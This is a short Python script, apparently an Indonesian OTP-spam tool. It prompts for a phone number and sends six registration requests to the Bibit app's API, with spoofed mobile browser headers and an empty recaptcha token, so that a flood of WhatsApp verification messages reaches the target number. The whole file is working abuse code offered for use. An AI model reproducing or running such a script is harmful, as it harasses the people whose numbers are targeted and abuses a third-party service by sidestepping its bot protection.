import os, sys, requests, random, json, string

def respound(nom):
  bibit = requests.post("https://api.bibit.id/auth/register/phone",headers={'Host':'api.bibit.id','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','x-platform':'web','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://app.bibit.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.bibit.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"code":"62","phone":nom,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})).text #Bibit api
  
def main():
  os.system("clear")
  nom = input(f"masukan nomor : 0")
  respound(nom)
  respound(nom) 
  respound(nom) 
  respound(nom)
  respound(nom) 
  respound(nom)
  
  
main()
